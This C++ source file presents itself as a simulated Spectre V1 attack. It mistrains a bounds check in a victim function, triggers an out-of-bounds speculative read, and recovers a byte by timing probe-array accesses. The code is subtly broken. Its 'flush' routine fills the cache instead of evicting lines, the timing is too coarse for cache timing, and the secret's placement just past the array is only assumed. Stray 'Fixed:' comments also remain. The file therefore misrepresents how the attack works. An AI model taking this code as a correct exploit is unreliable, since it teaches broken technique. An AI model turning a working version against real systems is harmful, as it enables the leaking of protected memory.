#include <iostream>
#include <vector>
#include <chrono> // For timing
#include <map>    // For storing timing results

// --- Victim's Code (simulated privileged/isolated context) ---
// In a real scenario, this would be part of a kernel, another process, or a secure enclave.
// We simulate a 'secret' array and a 'public' array.
unsigned char secret_data = 0x42;                                                        // Fixed: single byte instead of array
unsigned char public_array[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}; // Fixed: array size to match initializersdd
const size_t PUBLIC_ARRAY_SIZE = sizeof(public_array);

// This array is used to create a cache side channel.
// Each entry corresponds to a possible secret byte value (0-255)
// and is aligned to a cache line (e.g., 4096 bytes).
unsigned char probe_array[256 * 4096];

// Function to be speculatively attacked
void victim_function(size_t index)
{
    // This is the critical conditional branch (bounds check)
    // The attacker will try to make the CPU mispredict this.
    if (index < PUBLIC_ARRAY_SIZE)
    {
        // Speculatively, 'index' will be out-of-bounds,
        // causing 'public_array[index]' to read a secret byte.
        unsigned char value = public_array[index]; // This read is transient and unauthorized

        // Use the transiently read 'value' to access the probe_array.
        // This will bring a specific cache line into L1D cache.
        volatile unsigned char temp = probe_array[value * 4096]; // Cache side effect
    }
}

// --- Attacker's Code ---
// This code would run in an unprivileged context.

// Function to measure access time to a cache line
long long measure_access_time(volatile unsigned char *addr)
{
    auto start = std::chrono::high_resolution_clock::now();
    volatile unsigned char temp = *addr; // Access the memory
    auto end = std::chrono::high_resolution_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
}

// Function to flush a cache line (simplified, actual clflush is assembly)
void flush_cache_line(volatile unsigned char *addr)
{
    // In real exploits, this would involve assembly instructions like 'clflush'
    // or large array accesses to evict the line.
    // For high-level simulation, we assume it's flushed.
    // For demonstration, we can just ensure it's not in cache by accessing other memory.
    for (int i = 0; i < 256 * 4096; ++i)
    {
        probe_array[i] = 0; // Simple way to "clear" for simulation
    }
}

int main()
{
    // Initialize probe_array to ensure it's in memory
    for (int i = 0; i < 256 * 4096; ++i)
    {
        probe_array[i] = 1;
    }

    // Populate a "secret" byte in the public_array's memory region (out-of-bounds)
    // In a real attack, this secret would already exist in a privileged memory region
    // that the attacker can reach speculatively.
    // Here, we place a secret value (e.g., 'X') just beyond public_array's bounds.
    // This simulates 'public_array[index]' reading a secret.
    // Assuming public_array is at address P, and secret_data is at address S.
    // If index = (S - P) + offset_to_secret_byte, then public_array[index] reads S[offset_to_secret_byte].
    // For simplicity, let's assume the secret '0x42' is at index 16 (just past public_array).
    unsigned char *secret_location_simulated = &secret_data; // Fixed: point to actual secret data

    std::cout << "Starting Spectre V1 attack simulation..." << std::endl;

    // Phase 1: Mistrain the branch predictor
    // Repeatedly call victim_function with in-bounds indices
    std::cout << "Mistraining branch predictor..." << std::endl;
    for (int i = 0; i < 1000; ++i)
    {
        victim_function(i % PUBLIC_ARRAY_SIZE); // Always in-bounds
    }

    // Phase 2: Exploit and Leak
    std::cout << "Attempting to leak secret..." << std::endl;
    size_t malicious_index = PUBLIC_ARRAY_SIZE; // This index is out-of-bounds

    // Flush the probe array to ensure all lines are uncached
    for (int i = 0; i < 256; ++i)
    {
        flush_cache_line(&probe_array[i * 4096]);
    }

    // Trigger the speculative execution
    victim_function(malicious_index);

    // Phase 3: Recover the secret via side channel
    std::cout << "Measuring cache access times to recover secret..." << std::endl;
    long long min_time = -1;
    int leaked_byte = -1;

    for (int i = 0; i < 256; ++i)
    {
        long long time = measure_access_time(&probe_array[i * 4096]);
        if (min_time == -1 || time < min_time)
        { // Fixed: logical OR operator
            min_time = time;
            leaked_byte = i;
        }
    }

    std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
    std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;

    return 0;
}